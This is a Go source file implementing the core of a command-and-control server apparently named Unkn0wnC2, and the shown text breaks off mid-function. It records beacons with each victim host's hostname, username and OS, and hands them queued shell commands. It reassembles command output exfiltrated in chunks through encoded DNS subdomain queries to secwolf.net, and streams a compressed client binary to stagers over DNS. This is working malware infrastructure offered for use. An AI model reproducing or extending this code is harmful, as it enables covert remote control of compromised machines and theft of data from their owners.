// Package main implements the C2 management functionality for the Unkn0wnC2 server.
// This file handles beacon registration, task queuing, result collection, and
// the core C2 protocol logic including chunked data transmission.
package main

import (
	"bytes"
	"compress/gzip"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"
)

// Constants are now defined in constants.go

// Beacon represents a connected beacon client
type Beacon struct {
	ID        string    `json:"id"`
	Hostname  string    `json:"hostname"`
	Username  string    `json:"username"`
	OS        string    `json:"os"`
	Arch      string    `json:"arch"`
	LastSeen  time.Time `json:"last_seen"`
	IPAddress string    `json:"ip_address"`
	TaskQueue []Task    `json:"-"` // Don't serialize tasks
}

// Task represents a command task for a beacon
type Task struct {
	ID        string     `json:"id"`
	BeaconID  string     `json:"beacon_id"`
	Command   string     `json:"command"`
	Status    string     `json:"status"` // "pending", "sent", "completed", "failed"
	CreatedAt time.Time  `json:"created_at"`
	SentAt    *time.Time `json:"sent_at,omitempty"`
	Result    string     `json:"result,omitempty"`
}

// ResultChunk represents a piece of a multi-part result
type ResultChunk struct {
	BeaconID    string
	TaskID      string
	ChunkIndex  int
	TotalChunks int
	Data        string
	ReceivedAt  time.Time
}

// ExpectedResult tracks metadata for incoming chunked results
type ExpectedResult struct {
	BeaconID       string
	TaskID         string
	TotalSize      int
	TotalChunks    int
	ReceivedAt     time.Time
	ReceivedData   []string // Store chunks in order
	LastChunkIndex int      // Track last chunk received for progress calculation
}

// StagerSession tracks a stager deployment session
type StagerSession struct {
	ClientIP        string
	OS              string
	Arch            string
	Chunks          []string // Base64-encoded chunks
	TotalChunks     int
	CreatedAt       time.Time
	LastActivity    time.Time // Updated on each chunk request to prevent premature expiration
	StartedAt       time.Time // When first chunk was requested
	LastChunk       *int      // Last chunk index sent (pointer to differentiate nil from 0)
	ProgressRunning bool      // Track if progress updater is running
	ProgressDone    chan bool // Signal to stop progress updater
}

// C2Manager handles beacon management and tasking
type C2Manager struct {
	beacons         map[string]*Beacon
	tasks           map[string]*Task
	resultChunks    map[string][]ResultChunk   // key: taskID (legacy)
	expectedResults map[string]*ExpectedResult // key: taskID (new two-phase)
	stagerSessions  map[string]*StagerSession  // key: clientIP
	recentMessages  map[string]time.Time       // key: message hash, value: timestamp (deduplication)
	mutex           sync.RWMutex
	taskCounter     int
	debug           bool
	aesKey          []byte
	jitterConfig    StagerJitter // Stager timing configuration
}

// NewC2Manager creates a new C2 management instance with the specified configuration.
// It initializes the beacon tracking system, task management, and sets up AES encryption.
func NewC2Manager(debug bool, encryptionKey string, jitterConfig StagerJitter) *C2Manager {
	aesKey := generateAESKey(encryptionKey)

	c2 := &C2Manager{
		beacons:         make(map[string]*Beacon),
		tasks:           make(map[string]*Task),
		resultChunks:    make(map[string][]ResultChunk),
		expectedResults: make(map[string]*ExpectedResult),
		stagerSessions:  make(map[string]*StagerSession),
		recentMessages:  make(map[string]time.Time),
		taskCounter:     TaskCounterStart,
		debug:           debug,
		aesKey:          aesKey,
		jitterConfig:    jitterConfig,
	}

	// Start cleanup goroutine
	go c2.cleanupExpiredSessions()

	return c2
}

// calculateStagerETA calculates ETA using overall transfer rate (including pauses)
// Returns a human-readable duration string (e.g., "2m 30s", "45s", "2d 5h")
func calculateStagerETA(session *StagerSession, currentChunk int) string {
	if currentChunk >= session.TotalChunks {
		return "complete"
	}

	// Need at least one chunk to calculate
	if currentChunk < 1 || session.StartedAt.IsZero() {
		return "calculating..."
	}

	chunksRemaining := session.TotalChunks - currentChunk

	// ALWAYS use overall average rate including ALL elapsed time (pauses + transfers)
	// This is the only way to get accurate ETA for operations with jitter pauses
	elapsed := time.Since(session.StartedAt).Seconds()
	overallRate := elapsed / float64(currentChunk) // seconds per chunk (includes everything)

	// Estimate remaining time: seconds_per_chunk * chunks_remaining
	estimatedSecondsRemaining := overallRate * float64(chunksRemaining)

	duration := time.Duration(estimatedSecondsRemaining) * time.Second

	// Format as human-readable string with support for days
	if duration < time.Minute {
		return fmt.Sprintf("%ds", int(duration.Seconds()))
	} else if duration < time.Hour {
		minutes := int(duration.Minutes())
		seconds := int(duration.Seconds()) % 60
		if seconds > 0 {
			return fmt.Sprintf("%dm %ds", minutes, seconds)
		}
		return fmt.Sprintf("%dm", minutes)
	} else if duration < 24*time.Hour {
		hours := int(duration.Hours())
		minutes := int(duration.Minutes()) % 60
		if minutes > 0 {
			return fmt.Sprintf("%dh %dm", hours, minutes)
		}
		return fmt.Sprintf("%dh", hours)
	} else {
		// Days and hours for long transfers
		days := int(duration.Hours()) / 24
		hours := int(duration.Hours()) % 24
		if hours > 0 {
			return fmt.Sprintf("%dd %dh", days, hours)
		}
		return fmt.Sprintf("%dd", days)
	}
}

// renderProgressBar creates a visual progress bar for stager downloads
// Returns a formatted string with progress bar, percentage, and ETA
//
//nolint:unused // Used by logStagerProgress
func renderProgressBar(current, total int, eta string, clientIP string) string {
	if total == 0 {
		return ""
	}

	percentage := float64(current) / float64(total) * 100
	barWidth := 40
	filled := int(float64(barWidth) * float64(current) / float64(total))

	// Build progress bar
	bar := "["
	for i := 0; i < barWidth; i++ {
		if i < filled {
			bar += "="
		} else if i == filled && filled < barWidth {
			bar += ">"
		} else {
			bar += " "
		}
	}
	bar += "]"

	// Format: [=========>           ] 25% (10/40 chunks) ETA: 2m 30s - 192.168.1.100
	return fmt.Sprintf("\r[Stager] %s %.1f%% (%d/%d chunks) ETA: %s - %s",
		bar, percentage, current, total, eta, clientIP)
}

// startProgressUpdater starts a goroutine that continuously updates the progress bar
func (c2 *C2Manager) startProgressUpdater(session *StagerSession, clientIP string) {
	if session.ProgressRunning {
		return // Already running
	}

	session.ProgressRunning = true
	session.ProgressDone = make(chan bool)

	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()

		for {
			select {
			case <-session.ProgressDone:
				return
			case <-ticker.C:
				c2.mutex.RLock()
				if session.LastChunk == nil {
					c2.mutex.RUnlock()
					continue
				}
				current := *session.LastChunk + 1
				if current >= session.TotalChunks {
					c2.mutex.RUnlock()
					return
				}

				eta := calculateStagerETA(session, current)
				progressBar := renderProgressBar(current, session.TotalChunks, eta, clientIP)
				fmt.Print(progressBar)
				c2.mutex.RUnlock()
			}
		}
	}()
}

// stopProgressUpdater stops the progress updater goroutine
func (c2 *C2Manager) stopProgressUpdater(session *StagerSession) {
	if session.ProgressRunning && session.ProgressDone != nil {
		close(session.ProgressDone)
		session.ProgressRunning = false
	}
}

// logStagerProgress displays or updates the progress bar for stager downloads
func (c2 *C2Manager) logStagerProgress(session *StagerSession, chunkIndex int, clientIP string) {
	current := chunkIndex + 1
	eta := calculateStagerETA(session, current)

	progressBar := renderProgressBar(current, session.TotalChunks, eta, clientIP)

	// If this is the first chunk, print on new line and start progress updater
	if chunkIndex == 0 {
		fmt.Print("\n" + progressBar)
		c2.startProgressUpdater(session, clientIP)
	} else if current == session.TotalChunks {
		// Final chunk - stop updater and print completion
		c2.stopProgressUpdater(session)
		elapsed := time.Since(session.StartedAt)
		fmt.Printf("\r[Stager] %s %.1f%% (%d/%d chunks) Complete in %s - %s\n",
			"[========================================]", 100.0, session.TotalChunks, session.TotalChunks,
			formatDuration(elapsed), clientIP)
	} else {
		// Chunk received - the updater will continue showing progress
		fmt.Print(progressBar)
	}
}

// formatDuration formats a duration into human-readable format
//
//nolint:unused // Used by logStagerProgress
func formatDuration(d time.Duration) string {
	if d < time.Minute {
		return fmt.Sprintf("%ds", int(d.Seconds()))
	} else if d < time.Hour {
		minutes := int(d.Minutes())
		seconds := int(d.Seconds()) % 60
		if seconds > 0 {
			return fmt.Sprintf("%dm %ds", minutes, seconds)
		}
		return fmt.Sprintf("%dm", minutes)
	} else {
		hours := int(d.Hours())
		minutes := int(d.Minutes()) % 60
		return fmt.Sprintf("%dh %dm", hours, minutes)
	}
}

// renderTaskResultProgress creates a simple progress bar for task result chunks
func renderTaskResultProgress(received, total int, taskID string) string {
	if total == 0 {
		return ""
	}

	percentage := float64(received) / float64(total) * 100
	barWidth := 30
	filled := int(float64(barWidth) * float64(received) / float64(total))

	// Build progress bar
	bar := "["
	for i := 0; i < barWidth; i++ {
		if i < filled {
			bar += "="
		} else if i == filled && filled < barWidth {
			bar += ">"
		} else {
			bar += " "
		}
	}
	bar += "]"

	// Format: [========>     ] 45% (9/20 chunks) - T0001
	return fmt.Sprintf("\r[Task %s] %s %.0f%% (%d/%d chunks)",
		taskID, bar, percentage, received, total)
}

// cleanupExpiredSessions periodically removes expired stager sessions and expected results
func (c2 *C2Manager) cleanupExpiredSessions() {
	ticker := time.NewTicker(CleanupInterval)
	defer ticker.Stop()

	for range ticker.C {
		c2.mutex.Lock()
		now := time.Now()

		// Clean up expired stager sessions (collect IPs first to avoid iteration issues)
		var expiredSessionIPs []string
		for ip, session := range c2.stagerSessions {
			if now.Sub(session.LastActivity) > StagerSessionTimeout {
				expiredSessionIPs = append(expiredSessionIPs, ip)
			}
		}

		// Now safely stop progress updaters and delete sessions
		for _, ip := range expiredSessionIPs {
			if session, exists := c2.stagerSessions[ip]; exists {
				c2.stopProgressUpdater(session)
				delete(c2.stagerSessions, ip)
				if c2.debug {
					logf("[C2] Cleaned up expired stager session for %s (inactive for %v)", ip, now.Sub(session.LastActivity))
				}
			}
		}

		// Clean up expired expected results
		for taskID, expected := range c2.expectedResults {
			if now.Sub(expected.ReceivedAt) > ExpectedResultTimeout {
				delete(c2.expectedResults, taskID)
				if c2.debug {
					logf("[C2] Cleaned up expired expected result for task %s", taskID)
				}
			}
		}

		// Clean up recent message hashes older than RecentMessageTTL
		for msgHash, timestamp := range c2.recentMessages {
			if now.Sub(timestamp) > RecentMessageTTL {
				delete(c2.recentMessages, msgHash)
			}
		}

		c2.mutex.Unlock()
	}
}

// GetEncryptionKey returns the AES encryption key for external use
func (c2 *C2Manager) GetEncryptionKey() []byte {
	return c2.aesKey
}

// isPrintableASCII checks if a string contains only printable ASCII characters
// Used to validate that decrypted data is likely valid C2 traffic
func isPrintableASCII(s string) bool {
	for _, r := range s {
		// Allow printable ASCII (space to ~) plus newlines/tabs
		if r < 32 && r != 9 && r != 10 && r != 13 || r > 126 {
			return false
		}
	}
	return true
}

// decodeBeaconData decodes and decrypts beacon data using AES-GCM + base36
func (c2 *C2Manager) decodeBeaconData(encoded string) (string, error) {
	// Remove dots from DNS labels (e.g., "abc.def" -> "abcdef")
	// This handles long subdomains that get split into multiple labels
	encoded = strings.ReplaceAll(encoded, ".", "")

	// Use new base36 + AES-GCM decoding
	decoded, err := decodeAndDecrypt(encoded, c2.aesKey)
	if err != nil {
		return "", fmt.Errorf("failed to decode and decrypt: %v", err)
	}

	return decoded, nil
}

// isLegitimateSubdomain checks if a subdomain looks like a legitimate DNS name
// rather than encoded C2 data
// isLegitimateSubdomain determines if a DNS subdomain represents legitimate traffic
// rather than encoded C2 communications based on pattern analysis.
func isLegitimateSubdomain(subdomain string) bool {
	// Convert to lowercase for comparison
	lower := strings.ToLower(subdomain)

	// Common legitimate subdomains
	legitimate := []string{
		"ns1", "ns2", "ns3", "ns4",
		"www", "mail", "mx", "mx1", "mx2",
		"ftp", "smtp", "pop", "imap",
		"api", "cdn", "static", "img", "images",
		"blog", "shop", "store", "admin",
		"test", "dev", "staging", "beta",
	}

	for _, legit := range legitimate {
		if lower == legit {
			return true
		}
	}

	// If subdomain is very short (likely legitimate)
	if len(subdomain) <= 4 {
		return true
	}

	// If subdomain contains only letters and numbers with dashes (no base36-like pattern)
	// and is reasonably short, it's probably legitimate
	if len(subdomain) <= LegitimateSubdomainMaxLength && !looksLikeBase36(subdomain) {
		return true
	}

	return false
}

// looksLikeBase36 checks if a string looks like base36-encoded C2 data
// looksLikeBase36 analyzes a string to determine if it appears to be Base36-encoded data
// based on length, character distribution, and entropy characteristics.
func looksLikeBase36(s string) bool {
	// Remove any dots (from split labels)
	clean := strings.ReplaceAll(s, ".", "")

	// Must be reasonably long to be encoded data (base36 encoded AES-GCM data is typically long)
	if len(clean) < Base36MinLength {
		return false
	}

	// Check if all characters are valid base36 digits (0-9, a-z)
	for _, char := range clean {
		if !((char >= '0' && char <= '9') ||
			(char >= 'a' && char <= 'z')) {
			return false
		}
	}

	// Additional heuristics for base36 encoded data:
	// - Very long strings are likely encoded data
	// - High entropy (good mix of numbers and letters) suggests encoding
	if len(clean) > Base36LongStringThreshold {
		return true
	}

	// Check for good entropy (mix of numbers and letters)
	hasNumbers := false
	hasLetters := false
	for _, char := range clean {
		if char >= '0' && char <= '9' {
			hasNumbers = true
		}
		if char >= 'a' && char <= 'z' {
			hasLetters = true
		}
		if hasNumbers && hasLetters {
			break
		}
	}

	// If it has both numbers and letters and is reasonably long, it's likely base36 data
	return hasNumbers && hasLetters && len(clean) >= Base36MinLength
}

// processBeaconQuery processes a DNS query from a beacon and returns appropriate response
func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, bool) {
	c2.mutex.Lock()
	defer c2.mutex.Unlock()

	// Quick filter: only process queries to secwolf.net
	if !strings.HasSuffix(qname, "secwolf.net") {
		return "", false
	}

	// Extract subdomain before "secwolf.net"
	secwolfPos := strings.Index(qname, "secwolf.net")
	if secwolfPos == -1 {
		return "", false
	}

	subdomain := strings.TrimRight(qname[:secwolfPos], ".")
	if len(subdomain) == 0 {
		return "", false
	}

	// Skip legitimate DNS names (NS, MX, WWW, etc.) - check before processing
	firstLabel := subdomain
	if dotPos := strings.Index(subdomain, "."); dotPos != -1 {
		firstLabel = subdomain[:dotPos]
	}
	if isLegitimateSubdomain(firstLabel) {
		return "", false
	}

	// Both client and stager add timestamps for DNS cache busting
	// Format: base36_data_labels.timestamp.domain OR base36_label1.base36_label2.timestamp.domain
	// The timestamp is numeric (unix timestamp, 10 digits) and should be removed before decoding

	// Split subdomain into labels
	labels := strings.Split(subdomain, ".")

	// Check if last label is a timestamp (10-digit numeric string)
	var encodedLabels []string
	if len(labels) > 1 {
		lastLabel := labels[len(labels)-1]
		// Check if it's a unix timestamp (10-11 digits, all numeric)
		if len(lastLabel) >= 10 && len(lastLabel) <= 11 {
			isNumeric := true
			for _, c := range lastLabel {
				if c < '0' || c > '9' {
					isNumeric = false
					break
				}
			}
			if isNumeric {
				// Last label is a timestamp, remove it
				encodedLabels = labels[:len(labels)-1]
			} else {
				// Not a timestamp, keep all labels
				encodedLabels = labels
			}
		} else {
			// Last label isn't timestamp length, keep all labels
			encodedLabels = labels
		}
	} else {
		encodedLabels = labels
	}

	// Join all non-timestamp labels to reconstruct the base36 encoded message
	encodedMessage := strings.Join(encodedLabels, "")

	// Check if this looks like Base36-encoded data before trying to decode
	// This prevents attempting to decrypt random DNS queries
	if !looksLikeBase36(encodedMessage) {
		if c2.debug {
			logf("[DEBUG] Subdomain doesn't look like Base36 data, skipping: %s", subdomain)
		}
		return "", false
	}

	if c2.debug {
		logf("[DEBUG] Processing subdomain: %s, extracted message: %s (removed timestamp: %v)",
			subdomain, encodedMessage, len(encodedLabels) != len(labels))
		logf("[DEBUG] isLikelyBase36=%v, len=%d",
			looksLikeBase36(encodedMessage), len(encodedMessage))
	}

	// Try decrypting as encrypted beacon data first (normal client traffic)
	decoded, err := c2.decodeBeaconData(encodedMessage)

	// If decryption fails, try base36 decode without encryption (stager traffic)
	if err != nil {
		if c2.debug {
			logf("[DEBUG] AES-GCM decryption failed, trying plain base36 decode for stager")
		}
		decoded, err = base36DecodeString(encodedMessage)
		if err != nil {
			if c2.debug {
				logf("[DEBUG] Base36 decode also failed: %v", err)
			}
			return "", false
		}
		if c2.debug {
			logf("[DEBUG] Plain base36 decoded (stager): %s", decoded)
		}
	} else {
		if c2.debug {
			logf("[DEBUG] AES-GCM decrypted (client): %s", decoded)
		}
	}

	// Strip timestamp from decoded data (cache busting)
	// Format: COMMAND|data|...|timestamp -> COMMAND|data|...
	timestampParts := strings.Split(decoded, "|")
	if len(timestampParts) > 1 {
		// Check if last part is a timestamp (numeric)
		lastPart := timestampParts[len(timestampParts)-1]
		if len(lastPart) >= UnixTimestampMinLength && len(lastPart) <= UnixTimestampMaxLength { // Unix timestamp length
			if _, err := strconv.ParseInt(lastPart, 10, 64); err == nil {
				// Remove timestamp
				decoded = strings.Join(timestampParts[:len(timestampParts)-1], "|")
			}
		}
	}

	// Determine message type and split into parts appropriately so the result/data
	// payloads (which may contain '|' characters) are preserved in the last part.
	if len(decoded) == 0 {
		return "", false
	}

	// Validate that decoded data contains printable characters (sanity check)
	// If decryption produced garbage, don't log it
	if !isPrintableASCII(decoded) {
		if c2.debug {
			logf("[DEBUG] Decoded data contains non-printable characters, likely not C2 traffic")
		}
		return "", false
	}

	// Check for duplicate messages (DNS retries) - hash the content
	msgHash := fmt.Sprintf("%x", sha256.Sum256([]byte(decoded)))
	isDuplicate := false
	if lastSeen, exists := c2.recentMessages[msgHash]; exists {
		isDuplicate = true
		if c2.debug {
			logf("[DEBUG] Duplicate message detected (seen %v ago)", time.Since(lastSeen))
		}
	} else {
		// Mark new message as seen
		c2.recentMessages[msgHash] = time.Now()
	}

	messageType := strings.SplitN(decoded, "|", 2)[0]
	switch messageType {
	case "STG": // Stager request
		parts := strings.SplitN(decoded, "|", 4) // STG|IP|OS|ARCH
		if len(parts) < 4 {
			return "", false
		}
		return c2.handleStagerRequest(parts, clientIP, isDuplicate), true

	case "ACK": // Stager acknowledgment
		parts := strings.SplitN(decoded, "|", 4) // ACK|chunk_index|IP|session
		if len(parts) < 2 {
			return "", false
		}
		return c2.handleStagerAck(parts, clientIP, isDuplicate), true

	case "CHECKIN", "CHK":
		parts := strings.SplitN(decoded, "|", 5) // CHK|id|host|user|os
		if len(parts) < 5 {
			return "", false
		}
		return c2.handleCheckin(parts, clientIP, isDuplicate), true

	case "RESULT":
		// RESULT|beaconID|taskID|<entire result...>
		parts := strings.SplitN(decoded, "|", 4)
		if len(parts) < 4 {
			return "", false
		}
		return c2.handleResult(parts, isDuplicate), true

	case "RESULT_META":
		parts := strings.SplitN(decoded, "|", 5) // RESULT_META|id|task|size|chunks
		if len(parts) < 5 {
			return "", false
		}
		return c2.handleResultMeta(parts, isDuplicate), true

	case "DATA":
		// DATA|id|taskID|index|<chunk...>
		parts := strings.SplitN(decoded, "|", 5)
		if len(parts) < 5 {
			return "", false
		}
		return c2.handleData(parts, isDuplicate), true

	case "CHUNK": // DEPRECATED: Legacy single-phase chunking, kept for backward compatibility
		parts := strings.SplitN(decoded, "|", 6)
		if len(parts) < 6 {
			return "", false
		}
		return c2.handleChunk(parts), true

	default:
		// Only log if debug mode (reduces noise from random DNS queries)
		if c2.debug {
			logf("[DEBUG] Unknown message type: %s", messageType)
		}
		return "", false
	}
}

// handleCheckin processes a beacon check-in
func (c2 *C2Manager) handleCheckin(parts []string, clientIP string, isDuplicate bool) string {
	if len(parts) < 5 {
		return "ERROR"
	}

	beaconID := parts[1]
	hostname := parts[2]
	username := parts[3]
	os := parts[4]
	arch := "unknown" // Architecture removed from client data

	// Update or create beacon
	beacon, exists := c2.beacons[beaconID]
	if !exists {
		beacon = &Beacon{
			ID:        beaconID,
			TaskQueue: []Task{},
		}
		c2.beacons[beaconID] = beacon
		// Always log new beacon registration (even if duplicate DNS query)
		logf("[C2] New beacon: %s (%s@%s) %s/%s from %s", beaconID, username, hostname, os, arch, clientIP)
	}

	// Update beacon info
	beacon.Hostname = hostname
	beacon.Username = username
	beacon.OS = os
	beacon.Arch = arch
	beacon.LastSeen = time.Now()
	beacon.IPAddress = clientIP

	// Only log checkins in debug mode and skip duplicates
	if c2.debug && !isDuplicate {
		logf("[C2] Checkin: %s (%s@%s) from %s",
			beaconID, username, hostname, clientIP)
	}

	// Check if there are pending tasks for this beacon
	if len(beacon.TaskQueue) > 0 {
		task := beacon.TaskQueue[0]
		beacon.TaskQueue = beacon.TaskQueue[1:] // Remove the task from queue

		// Mark task as sent
		if storedTask, exists := c2.tasks[task.ID]; exists {
			storedTask.Status = "sent"
			now := time.Now()
			storedTask.SentAt = &now
		}

		taskResponse := fmt.Sprintf("TASK|%s|%s", task.ID, task.Command)
		logf("[C2] Task %s → %s: %s", task.ID, beaconID, task.Command)
		return taskResponse
	}

	return "ACK" // No tasks available
}

// handleResult processes a command result from a beacon
func (c2 *C2Manager) handleResult(parts []string, isDuplicate bool) string {
	if len(parts) < 4 {
		return "ERROR"
	}

	beaconID := parts[1]
	taskID := parts[2]
	result := parts[3]

	// Log receipt of result (include small preview) - skip for duplicates
	if !isDuplicate {
		preview := result
		if len(preview) > ResultPreviewMaxLength {
			preview = preview[:ResultPreviewMaxLength] + "..."
		}
		logf("[C2] Result: %s → %s: %s", beaconID, taskID, preview)
	}

	// Update the task
	if task, exists := c2.tasks[taskID]; exists {
		task.Result = result
		task.Status = "completed"
	}

	return "ACK"
}

// handleChunk processes a chunk of result data (DEPRECATED - legacy protocol)
func (c2 *C2Manager) handleChunk(parts []string) string {
	if len(parts) < 6 {
		return "ERROR"
	}

	beaconID := parts[1]
	taskID := parts[2]
	chunkIndex, _ := strconv.Atoi(parts[3])
	totalChunks, _ := strconv.Atoi(parts[4])
	data := parts[5]

	// Store the chunk
	chunk := ResultChunk{
		BeaconID:    beaconID,
		TaskID:      taskID,
		ChunkIndex:  chunkIndex,
		TotalChunks: totalChunks,
		Data:        data,
		ReceivedAt:  time.Now(),
	}

	c2.resultChunks[taskID] = append(c2.resultChunks[taskID], chunk)

	// Check if we have all chunks
	chunks := c2.resultChunks[taskID]
	if len(chunks) == totalChunks {
		// Reconstruct the complete result
		result := c2.reconstructResult(chunks)

		// Update the task
		if task, exists := c2.tasks[taskID]; exists {
			task.Result = result
			task.Status = "completed"
			logf("[C2] Result: %s → %s (%d bytes, %d chunks)", beaconID, taskID, len(result), totalChunks)
		}

		// Clean up chunks
		delete(c2.resultChunks, taskID)
	}

	return "ACK"
}

// reconstructResult reconstructs a complete result from chunks
func (c2 *C2Manager) reconstructResult(chunks []ResultChunk) string {
	// Sort chunks by index
	sortedChunks := make([]string, len(chunks))
	for _, chunk := range chunks {
		if chunk.ChunkIndex > 0 && chunk.ChunkIndex <= len(chunks) {
			sortedChunks[chunk.ChunkIndex-1] = chunk.Data
		}
	}

	return strings.Join(sortedChunks, "")
}

// handleResultMeta processes result metadata from beacon (two-phase protocol)
func (c2 *C2Manager) handleResultMeta(parts []string, isDuplicate bool) string {
	if len(parts) < 5 {
		return "ERROR"
	}

	beaconID := parts[1]
	taskID := parts[2]
	totalSize, _ := strconv.Atoi(parts[3])
	totalChunks, _ := strconv.Atoi(parts[4])

	if !isDuplicate {
		logf("[C2] Expecting chunked result from %s for %s: %d bytes in %d chunks",
			beaconID, taskID, totalSize, totalChunks)
	}

	// Store the expectation
	expected := &ExpectedResult{
		BeaconID:     beaconID,
		TaskID:       taskID,
		TotalSize:    totalSize,
		TotalChunks:  totalChunks,
		ReceivedAt:   time.Now(),
		ReceivedData: make([]string, totalChunks),
	}

	c2.expectedResults[taskID] = expected
	return "ACK"
}

// handleData processes data chunks from beacon (two-phase protocol)
func (c2 *C2Manager) handleData(parts []string, isDuplicate bool) string {
	if len(parts) < 5 {
		return "ERROR"
	}

	beaconID := parts[1]
	taskID := parts[2]
	chunkIndex, _ := strconv.Atoi(parts[3])
	data := parts[4]

	// Check if we're expecting this data
	expected, exists := c2.expectedResults[taskID]
	if !exists {
		// Check if task already completed (duplicate chunk after completion)
		if task, taskExists := c2.tasks[taskID]; taskExists && task.Status == "completed" {
			// Task already completed, this is a duplicate chunk - silently ACK
			if c2.debug {
				logf("[DEBUG] Received duplicate DATA chunk for completed task %s", taskID)
			}
			return "ACK"
		}
		// Unknown task, log warning only if not a duplicate message
		if !isDuplicate {
			logf("[C2] Warning: Received DATA chunk for unknown task %s", taskID)
		}
		return "ERROR"
	}

	// Store the chunk (1-indexed from client, 0-indexed in array)
	if chunkIndex > 0 && chunkIndex <= expected.TotalChunks {
		// Only update if this is a new chunk (not a duplicate)
		if expected.ReceivedData[chunkIndex-1] == "" {
			expected.ReceivedData[chunkIndex-1] = data
			expected.LastChunkIndex = chunkIndex
		}
	} else {
		logf("[C2] Warning: Invalid chunk index %d for task %s (expected 1-%d)",
			chunkIndex, taskID, expected.TotalChunks)
		return "ERROR"
	}

	// Check if we have all chunks
	complete := true
	receivedCount := 0
	for i := 0; i < expected.TotalChunks; i++ {
		if expected.ReceivedData[i] != "" {
			receivedCount++
		} else {
			complete = false
		}
	}

	// Silent background chunk assembly - progress only shown when 'tasks' command is run
	// No console output here to avoid blocking console for other beacon operations

	if complete {
		// Reconstruct the complete result
		result := strings.Join(expected.ReceivedData, "")

		// Only log if not a duplicate
		if !isDuplicate {
			logf("[C2] Result: %s → %s (%d bytes, %d chunks)", beaconID, taskID, len(result), expected.TotalChunks)
		}

		// Update the task
		if task, exists := c2.tasks[taskID]; exists {
			task.Result = result
			task.Status = "completed"
		}

		// Clean up
		delete(c2.expectedResults, taskID)
	}

	return "ACK"
}

// handleStagerRequest processes a stager deployment request
// Format: STG|IP|OS|ARCH
func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string, isDuplicate bool) string {
	if len(parts) < 4 {
		return "ERROR"
	}

	stagerIP := parts[1]
	stagerOS := parts[2]
	stagerArch := parts[3]

	if !isDuplicate {
		logf("[C2] Stager request from %s (%s/%s) - IP: %s", clientIP, stagerOS, stagerArch, stagerIP)
	}

	// Determine client binary filename based on OS
	var clientFilename string
	if strings.ToLower(stagerOS) == "windows" {
		clientFilename = "dns-client-windows.exe"
	} else {
		clientFilename = "dns-client-linux"
	}

	// Try multiple possible paths for the client binary
	var clientPath string
	possiblePaths := []string{
		filepath.Join("build", clientFilename),       // If running from project root
		filepath.Join("..", "build", clientFilename), // If running from Server/ directory
		filepath.Join(".", clientFilename),           // Same directory
		clientFilename,                               // Current directory
	}

	// Find the first existing path
	for _, path := range possiblePaths {
		if _, err := os.Stat(path); err == nil {
			clientPath = path
			break
		}
	}

	// Check if we found a valid path
	if clientPath == "" {
		if !isDuplicate {
			logf("[C2] Error: Client binary not found. Tried paths: %v", possiblePaths)
		}
		return "ERROR|BINARY_NOT_FOUND"
	}

	if !isDuplicate {
		logf("[C2] Found client binary at: %s", clientPath)
	}

	// Read client binary
	clientData, err := os.ReadFile(clientPath)
	if err != nil {
		if !isDuplicate {
			logf("[C2] Error reading client binary: %v", err)
		}
		return "ERROR|READ_FAILED"
	}

	if !isDuplicate {
		logf("[C2] Loaded client binary: %s (%d bytes)", clientPath, len(clientData))
	}

	// Compress with gzip (use bytes.Buffer so we preserve raw binary data)
	var compressedBuf bytes.Buffer
	gzWriter := gzip.NewWriter(&compressedBuf)
	_, err = gzWriter.Write(clientData)
	if err != nil {
		if !isDuplicate {
			logf("[C2] Error compressing client: %v", err)
		}
		return "ERROR|COMPRESS_FAILED"
	}
	gzWriter.Close()

	compressed := compressedBuf.Bytes()
	if !isDuplicate {
		logf("[C2] Compressed client: %d bytes -> %d bytes (%.1f%% reduction)",
			len(clientData), len(compressed),
			100.0*(1.0-float64(len(compressed))/float64(len(clientData))))
	}

	// Base64 encode
	base64Data := base64.StdEncoding.EncodeToString(compressed)
	if !isDuplicate {
		logf("[C2] Base64 encoded: %d bytes", len(base64Data))
	}

	// Split into chunks (403 bytes - tested maximum for DNS infrastructure)
	const chunkSize = 403
	var chunks []string
	for i := 0; i < len(base64Data); i += chunkSize {
		end := i + chunkSize
		if end > len(base64Data) {
			end = len(base64Data)
		}
		chunks = append(chunks, base64Data[i:end])
	}

	if !isDuplicate {
		logf("[C2] Stager deployment initiated: %s (%s/%s) - %d chunks (%d bytes each)",
			stagerIP, stagerOS, stagerArch, len(chunks), chunkSize)
	}

	// Store session for this stager using the stager's actual IP (not DNS resolver IP)
	// This allows the stager to send ACKs through different DNS resolvers
	session := &StagerSession{
		ClientIP:     stagerIP, // Use stager's IP from the STG message
		OS:           stagerOS,
		Arch:         stagerArch,
		Chunks:       chunks,
		TotalChunks:  len(chunks),
		CreatedAt:    time.Now(),
		LastActivity: time.Now(), // Initialize activity timestamp
	}
	c2.stagerSessions[stagerIP] = session // Key by stager's actual IP

	// Return metadata
	return fmt.Sprintf("META|%d", len(chunks))
}

// handleStagerAck processes a stager acknowledgment for chunk delivery
// Format: ACK|chunk_index|stager_IP|hostname
func (c2 *C2Manager) handleStagerAck(parts []string, clientIP string, isDuplicate bool) string {
	if len(parts) < 4 {
		return "ERROR"
	}

	chunkIndex, err := strconv.Atoi(parts[1])
	if err != nil {
		if !isDuplicate {
			logf("[C2] Invalid chunk index from %s: %s", clientIP, parts[1])
		}
		return "ERROR|INVALID_INDEX"
	}

	stagerIP := parts[2] // Extract stager's actual IP from ACK message

	// Look up the stager session using stager's actual IP (not DNS resolver IP)
	session, exists := c2.stagerSessions[stagerIP]
	if !exists {
		if !isDuplicate {
			logf("[C2] No stager session found for stager IP %s (DNS resolver: %s)", stagerIP, clientIP)
		}
		return "ERROR|NO_SESSION"
	}

	// Update last activity timestamp to keep session alive during active downloads
	now := time.Now()
	session.LastActivity = now

	// Initialize start time on first chunk
	if chunkIndex == 0 && session.StartedAt.IsZero() {
		session.StartedAt = now
	}

	// Validate chunk index
	if chunkIndex < 0 || chunkIndex >= session.TotalChunks {
		if !isDuplicate {
			logf("[C2] Invalid chunk index %d (total: %d) from %s",
				chunkIndex, session.TotalChunks, clientIP)
		}
		return "ERROR|INDEX_OUT_OF_RANGE"
	}

	// Get the requested chunk
	chunk := session.Chunks[chunkIndex]

	if !isDuplicate {
		// Only update progress bar if this is a NEW chunk (different from last one)
		if session.LastChunk == nil || *session.LastChunk != chunkIndex {
			// Update last chunk sent
			session.LastChunk = &chunkIndex

			// Display progress bar instead of individual log lines
			c2.logStagerProgress(session, chunkIndex, stagerIP)
		}
	}

